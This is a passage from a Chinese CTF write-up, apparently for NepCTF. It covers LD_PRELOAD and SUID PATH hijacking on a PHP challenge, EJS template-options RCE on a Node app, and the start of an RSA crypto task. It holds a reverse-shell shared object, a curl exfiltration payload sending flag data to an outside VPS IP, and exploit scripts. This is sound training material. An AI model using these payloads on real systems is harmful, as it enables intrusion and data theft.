</span></span></code></pre></div><p>ftp下载文件</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=mi>0</span><span class=o>=</span><span class=err>$</span><span class=n>local_file</span> <span class=o>=</span> <span class=s2>&#34;/tmp/evil.so&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=err>$</span><span class=n>server_file</span> <span class=o>=</span> <span class=s2>&#34;evil.so&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=err>$</span><span class=n>ftp_server</span> <span class=o>=</span> <span class=s2>&#34;ip&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=err>$</span><span class=n>ftp_port</span> <span class=o>=</span> <span class=mi>21</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=err>$</span><span class=n>ftp</span> <span class=o>=</span> <span class=n>ftp_connect</span><span class=p>(</span><span class=err>$</span><span class=n>ftp_server</span><span class=p>,</span> <span class=err>$</span><span class=n>ftp_port</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=err>$</span><span class=n>login_result</span> <span class=o>=</span> <span class=n>ftp_login</span><span class=p>(</span><span class=err>$</span><span class=n>ftp</span><span class=p>,</span> <span class=s2>&#34;username&#34;</span><span class=p>,</span> <span class=s2>&#34;password&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>ftp_pasv</span><span class=p>(</span><span class=err>$</span><span class=n>ftp</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>ftp_get</span><span class=p>(</span><span class=err>$</span><span class=n>ftp</span><span class=p>,</span> <span class=err>$</span><span class=n>local_file</span><span class=p>,</span> <span class=err>$</span><span class=n>server_file</span><span class=p>,</span> <span class=n>FTP_BINARY</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>    <span class=n>echo</span> <span class=s2>&#34;Successfully written to $local_file</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>echo</span> <span class=s2>&#34;Failed!</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>ftp_close</span><span class=p>(</span><span class=err>$</span><span class=n>ftp</span><span class=p>);</span>
</span></span></code></pre></div><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152331.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152331.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152331.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152331.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152331.png title=img></p><p>包含evil.txt文件触发</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152332.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152332.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152332.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152332.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152332.png title=img></p><p>反弹shell，发现权限不够</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152333.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152333.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152333.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152333.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152333.png title=img></p><p>suid提权，发现 /showmsg</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152334.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152334.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152334.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152334.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152334.png title=img></p><p>同时还给了源码 /src.c</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152335.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152335.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152335.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152335.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152335.png title=img></p><p>cat没有指定路径，故可以环境提权</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>echo</span> <span class=o>-</span><span class=n>e</span> <span class=s1>&#39;#!/bin/sh</span><span class=se>\n</span><span class=s1>tail /flag&#39;</span> <span class=o>&gt;</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>cat</span> <span class=o>&amp;&amp;</span> <span class=n>chmod</span> <span class=mi>755</span> <span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>cat</span>
</span></span><span class=line><span class=cl><span class=n>export</span> <span class=n>PATH</span><span class=o>=/</span><span class=n>tmp</span><span class=p>:</span><span class=err>$</span><span class=n>PATH</span>
</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>showmsg</span>
</span></span></code></pre></div><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152336.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152336.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152336.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152336.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152336.png title=img></p><h4 id=思路二-ld_preload劫持>思路二 LD_PRELOAD劫持</h4><p>参考：<a href=https://blog.csdn.net/qq_63701832/article/details/129760495 target=_blank rel="noopener noreffer">LD_PRELOAD劫持（超详细篇）</a></p><p>特点：putenv没禁</p><p>evil.c</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#include &lt;stdio.h&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;unistd.h&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;stdio.h&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__attribute__</span> <span class=p>((</span><span class=n>__constructor__</span><span class=p>))</span> <span class=n>void</span> <span class=n>angel</span> <span class=p>(</span><span class=n>void</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=n>unsetenv</span><span class=p>(</span><span class=s2>&#34;LD_PRELOAD&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>system</span><span class=p>(</span><span class=s2>&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/119.29.207.27/3000 &lt;&amp;1&#39;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>编译生成.so，ftp下载到/tmp/evil.so</p><p>同时需要一个函数触发系统函数，从而触发LD劫持，常见是<code>mail</code>和<code>error_log</code>，被禁了，这里<code>mb_send_mail</code>可代替</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#post</span>
</span></span><span class=line><span class=cl><span class=mi>0</span><span class=o>=</span><span class=n>putenv</span><span class=p>(</span><span class=s2>&#34;LD_PRELOAD=/tmp/evil.so&#34;</span><span class=p>);</span><span class=n>mb_send_mail</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>,</span><span class=s2>&#34;&#34;</span><span class=p>,</span><span class=s2>&#34;&#34;</span><span class=p>);</span>
</span></span></code></pre></div><h4 id=php上传配合临时文件触发ld劫持>php上传配合临时文件触发LD劫持</h4><p>一个name为0，表示post参数名</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152337.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152337.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152337.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152337.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152337.png title=img></p><h3 id=post-crad-for-you>Post Crad For You</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>var</span> <span class=nx>path</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;path&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>fs</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;fs&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>crypto</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;crypto&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>express</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;express&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>app</span> <span class=o>=</span> <span class=nx>express</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>port</span> <span class=o>=</span> <span class=mi>3000</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>templateDir</span> <span class=o>=</span> <span class=nx>path</span><span class=p>.</span><span class=nx>join</span><span class=p>(</span><span class=nx>__dirname</span><span class=p>,</span> <span class=s1>&#39;template&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span><span class=s1>&#39;view engine&#39;</span><span class=p>,</span> <span class=s1>&#39;ejs&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>set</span><span class=p>(</span><span class=s1>&#39;template&#39;</span><span class=p>,</span> <span class=nx>templateDir</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>sleep</span><span class=p>(</span><span class=nx>milliSeconds</span><span class=p>){</span> 
</span></span><span class=line><span class=cl>	<span class=kd>var</span> <span class=nx>StartTime</span> <span class=o>=</span><span class=k>new</span> <span class=nb>Date</span><span class=p>().</span><span class=nx>getTime</span><span class=p>();</span> 
</span></span><span class=line><span class=cl>	<span class=kd>let</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>while</span> <span class=p>(</span><span class=k>new</span> <span class=nb>Date</span><span class=p>().</span><span class=nx>getTime</span><span class=p>()</span> <span class=o>&lt;</span><span class=nx>StartTime</span><span class=o>+</span><span class=nx>milliSeconds</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span> <span class=kd>function</span><span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>sendFile</span><span class=p>(</span><span class=s1>&#39;./index.html&#39;</span><span class=p>,</span> <span class=p>{</span><span class=nx>root</span><span class=o>:</span> <span class=nx>__dirname</span><span class=p>});</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/create&#39;</span><span class=p>,</span> <span class=kd>function</span><span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kd>let</span> <span class=nx>uuid</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kd>let</span> <span class=nx>name</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>query</span><span class=p>.</span><span class=nx>name</span> <span class=o>??</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kd>let</span> <span class=nx>address</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>query</span><span class=p>.</span><span class=nx>address</span> <span class=o>??</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=kd>let</span> <span class=nx>message</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>query</span><span class=p>.</span><span class=nx>message</span> <span class=o>??</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>do</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>uuid</span> <span class=o>=</span> <span class=nx>crypto</span><span class=p>.</span><span class=nx>randomUUID</span><span class=p>();</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=nx>fs</span><span class=p>.</span><span class=nx>existsSync</span><span class=p>(</span><span class=sb>`</span><span class=si>${</span><span class=nx>templateDir</span><span class=si>}</span><span class=sb>/</span><span class=si>${</span><span class=nx>uuid</span><span class=si>}</span><span class=sb>.ejs`</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=nx>name</span> <span class=o>!=</span> <span class=s1>&#39;&#39;</span> <span class=o>&amp;&amp;</span> <span class=nx>address</span> <span class=o>!=</span> <span class=s1>&#39;&#39;</span> <span class=o>&amp;&amp;</span> <span class=nx>message</span> <span class=o>!=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=kd>let</span> <span class=nx>source</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;source&#34;</span><span class=p>,</span> <span class=s2>&#34;source1&#34;</span><span class=p>,</span> <span class=s2>&#34;source2&#34;</span><span class=p>,</span> <span class=s2>&#34;source3&#34;</span><span class=p>].</span><span class=nx>sort</span><span class=p>(</span><span class=kd>function</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>				<span class=k>return</span> <span class=mf>0.5</span> <span class=o>-</span> <span class=nb>Math</span><span class=p>.</span><span class=nx>random</span><span class=p>();</span>
</span></span><span class=line><span class=cl>			<span class=p>})</span>
</span></span><span class=line><span class=cl>			<span class=nx>fs</span><span class=p>.</span><span class=nx>readFile</span><span class=p>(</span><span class=nx>source</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>+</span><span class=s2>&#34;.html&#34;</span><span class=p>,</span> <span class=s1>&#39;utf8&#39;</span><span class=p>,</span><span class=kd>function</span><span class=p>(</span><span class=nx>err</span><span class=p>,</span> <span class=nx>pageContent</span><span class=p>){</span>
</span></span><span class=line><span class=cl>				<span class=nx>fs</span><span class=p>.</span><span class=nx>writeFileSync</span><span class=p>(</span><span class=sb>`</span><span class=si>${</span><span class=nx>templateDir</span><span class=si>}</span><span class=sb>/</span><span class=si>${</span><span class=nx>uuid</span><span class=si>}</span><span class=sb>.ejs`</span><span class=p>,</span> <span class=nx>pageContent</span><span class=p>.</span><span class=nx>replace</span><span class=p>(</span><span class=sr>/--ID--/g</span><span class=p>,</span> <span class=nx>uuid</span><span class=p>.</span><span class=nx>replace</span><span class=p>(</span><span class=sr>/-/g</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)));</span>
</span></span><span class=line><span class=cl>				<span class=nx>sleep</span><span class=p>(</span><span class=mi>2000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=p>})</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>500</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;Params `name` or `address` or `message` empty&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span> <span class=k>catch</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>500</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;Failed to write file&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>redirect</span><span class=p>(</span><span class=sb>`/page?pageid=</span><span class=si>${</span><span class=nx>uuid</span><span class=si>}</span><span class=sb>&amp;name=</span><span class=si>${</span><span class=nx>name</span><span class=si>}</span><span class=sb>&amp;address=</span><span class=si>${</span><span class=nx>address</span><span class=si>}</span><span class=sb>&amp;message=</span><span class=si>${</span><span class=nx>message</span><span class=si>}</span><span class=sb>`</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/page&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span><span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=kd>let</span> <span class=nx>id</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>query</span><span class=p>.</span><span class=nx>pageid</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=sr>/^[0-9A-F]{8}-[0-9A-F]{4}-[4][0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i</span><span class=p>.</span><span class=nx>test</span><span class=p>(</span><span class=nx>id</span><span class=p>)</span> <span class=o>||</span> <span class=o>!</span><span class=nx>fs</span><span class=p>.</span><span class=nx>existsSync</span><span class=p>(</span><span class=sb>`</span><span class=si>${</span><span class=nx>templateDir</span><span class=si>}</span><span class=sb>/</span><span class=si>${</span><span class=nx>id</span><span class=si>}</span><span class=sb>.ejs`</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>404</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;Sorry, no such id&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>			<span class=nx>res</span><span class=p>.</span><span class=nx>render</span><span class=p>(</span><span class=sb>`</span><span class=si>${</span><span class=nx>templateDir</span><span class=si>}</span><span class=sb>/</span><span class=si>${</span><span class=nx>id</span><span class=si>}</span><span class=sb>.ejs`</span><span class=p>,</span> <span class=nx>req</span><span class=p>.</span><span class=nx>query</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>			<span class=nx>app</span><span class=p>.</span><span class=nx>listen</span><span class=p>(</span><span class=nx>port</span><span class=p>,</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=sb>`App listening on port </span><span class=si>${</span><span class=nx>port</span><span class=si>}</span><span class=sb>`</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=p>})</span>
</span></span></code></pre></div><p><code>res.render(</code>${templateDir}/${id}.ejs<code>, req.query);</code>ejs模板 原型链污染</p><p>参考：</p><p><a href=https://blog.huli.tw/2023/06/22/ejs-render-vulnerability-ctf/ target=_blank rel="noopener noreffer">https://blog.huli.tw/2023/06/22/ejs-render-vulnerability-ctf/</a></p><p><a href=https://blog.csdn.net/qq_61768489/article/details/129503772 target=_blank rel="noopener noreffer">https://blog.csdn.net/qq_61768489/article/details/129503772</a></p><p>ejs-render-rce</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152338.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152338.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152338.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152338.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152338.png title=img></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=err>settings:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=err>&#39;view</span> <span class=err>options&#39;:</span> <span class=err>{</span>
</span></span><span class=line><span class=cl>    <span class=err>client:</span> <span class=err>true,</span>
</span></span><span class=line><span class=cl>    <span class=err>escape:</span> <span class=err>&#39;function(){return</span> <span class=err>process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;)</span><span class=p>}</span><span class=err>&#39;</span>
</span></span><span class=line><span class=cl>  <span class=err>}</span>
</span></span><span class=line><span class=cl><span class=err>}</span>
</span></span><span class=line><span class=cl><span class=err>import</span> <span class=err>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>url</span> <span class=err>=</span> <span class=err>&#39;http:</span><span class=c1>//nepctf.1cepeak.cn:32051&#39;
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=err>params=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;test&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;address&#34;</span><span class=p>:</span><span class=s2>&#34;test&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;message&#34;</span><span class=p>:</span><span class=s2>&#34;test&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=err>res</span> <span class=err>=</span> <span class=err>requests.get(url+</span><span class=s2>&#34;/create&#34;</span><span class=err>,params=params,allow_redirects=False)</span>
</span></span><span class=line><span class=cl><span class=err>path=res.headers</span><span class=p>[</span><span class=err>&#39;location&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>#</span> <span class=err>cmd</span> <span class=err>=</span> <span class=s2>&#34;ls /&#34;</span>
</span></span><span class=line><span class=cl><span class=err>cmd</span> <span class=err>=</span> <span class=s2>&#34;cat /flag&#34;</span>
</span></span><span class=line><span class=cl><span class=err>#</span> <span class=err>外带到vps</span>
</span></span><span class=line><span class=cl><span class=err>payload=</span><span class=s2>&#34;&amp;settings[view options][escape]=function(){return process.mainModule.require(&#39;child_process&#39;).execSync(&#39;curl http://119.29.207.27:3000/`&#34;</span><span class=err>+cmd+</span><span class=s2>&#34;|base64`&#39;)}&amp;font=aaa&amp;fontSize=aaa&amp;settings[view options][client]=true&#34;</span>
</span></span><span class=line><span class=cl><span class=err>res</span><span class=mi>2</span><span class=err>=requests.get(url=url+path+payload)</span>
</span></span></code></pre></div><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152339.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152339.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152339.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152339.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152339.png title=img></p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152340.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152340.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152340.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152340.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152340.png title=img></p><h2 id=crypto看>Crypto（看</h2><p><a href=https://nepnep-team.feishu.cn/wiki/SlmLwUflEisv6EkIkFYc9J4Ennh#JlCRduVFZokuafx9bIic2eken5e target=_blank rel="noopener noreffer">https://nepnep-team.feishu.cn/wiki/SlmLwUflEisv6EkIkFYc9J4Ennh#JlCRduVFZokuafx9bIic2eken5e</a></p><h3 id=random_rsa>random_RSA</h3><p>考点：维纳攻击，MT19937攻击，</p><p>RSA_random.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>from</span> <span class=n>gmpy2</span> <span class=n>import</span> <span class=n>next_prime</span><span class=p>,</span> <span class=n>invert</span> <span class=n>as</span> <span class=n>inverse_mod</span>
</span></span><span class=line><span class=cl><span class=n>from</span> <span class=n>Crypto</span><span class=p>.</span><span class=n>Cipher</span> <span class=n>import</span> <span class=n>PKCS1_v1_5</span>
</span></span><span class=line><span class=cl><span class=n>from</span> <span class=n>Crypto</span><span class=p>.</span><span class=n>PublicKey</span> <span class=n>import</span> <span class=n>RSA</span>
</span></span><span class=line><span class=cl><span class=n>from</span> <span class=n>random</span> <span class=n>import</span> <span class=n>getrandbits</span>
</span></span><span class=line><span class=cl><span class=n>from</span> <span class=n>math</span> <span class=n>import</span> <span class=n>lcm</span>
</span></span><span class=line><span class=cl><span class=n>from</span> <span class=n>sys</span> <span class=n>import</span> <span class=n>exit</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>global_bits</span> <span class=o>=</span> <span class=mi>1024</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>BANNER</span> <span class=o>=</span> <span class=n>rb</span><span class=s>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=p>.</span><span class=o>--------</span><span class=p>.</span><span class=o>--------</span><span class=p>.</span><span class=o>--------</span><span class=p>.</span><span class=o>--------</span><span class=p>.</span><span class=o>--------</span><span class=p>.</span><span class=o>--------</span><span class=p>.</span><span class=o>--------</span><span class=p>.</span><span class=o>--------</span><span class=p>.</span><span class=o>--------</span><span class=p>.</span><span class=o>--------</span><span class=p>.</span><span class=o>--------</span><span class=p>.</span>
</span></span><span class=line><span class=cl><span class=o>|</span> <span class=n>N</span><span class=p>.</span><span class=o>--</span><span class=p>.</span>  <span class=o>|</span> <span class=n>E</span><span class=p>.</span><span class=o>--</span><span class=p>.</span>  <span class=o>|</span> <span class=n>P</span><span class=p>.</span><span class=o>--</span><span class=p>.</span>  <span class=o>|</span> <span class=n>C</span><span class=p>.</span><span class=o>--</span><span class=p>.</span>  <span class=o>|</span> <span class=n>T</span><span class=p>.</span><span class=o>--</span><span class=p>.</span>  <span class=o>|</span> <span class=n>F</span><span class=p>.</span><span class=o>--</span><span class=p>.</span>  <span class=o>|</span> <span class=n>H</span><span class=p>.</span><span class=o>--</span><span class=p>.</span>  <span class=o>|</span> <span class=n>A</span><span class=p>.</span><span class=o>--</span><span class=p>.</span>  <span class=o>|</span> <span class=n>P</span><span class=p>.</span><span class=o>--</span><span class=p>.</span>  <span class=o>|</span> <span class=n>P</span><span class=p>.</span><span class=o>--</span><span class=p>.</span>  <span class=o>|</span> <span class=n>Y</span><span class=p>.</span><span class=o>--</span><span class=p>.</span>  <span class=o>|</span>
</span></span><span class=line><span class=cl><span class=o>|</span>  <span class=o>:/</span><span class=err>\</span><span class=o>:</span>  <span class=o>|</span>  <span class=p>(</span><span class=err>\</span><span class=o>/</span><span class=p>)</span>  <span class=o>|</span>  <span class=o>:</span><span class=p>()</span><span class=o>:</span>  <span class=o>|</span>  <span class=o>:/</span><span class=err>\</span><span class=o>:</span>  <span class=o>|</span>  <span class=o>:/</span><span class=err>\</span><span class=o>:</span>  <span class=o>|</span>  <span class=o>:/</span><span class=err>\</span><span class=o>:</span>  <span class=o>|</span>  <span class=p>(</span><span class=err>\</span><span class=o>/</span><span class=p>)</span>  <span class=o>|</span>  <span class=o>:</span><span class=p>()</span><span class=o>:</span>  <span class=o>|</span>  <span class=o>:/</span><span class=err>\</span><span class=o>:</span>  <span class=o>|</span>  <span class=o>:/</span><span class=err>\</span><span class=o>:</span>  <span class=o>|</span>  <span class=p>(</span><span class=err>\</span><span class=o>/</span><span class=p>)</span>  <span class=o>|</span>
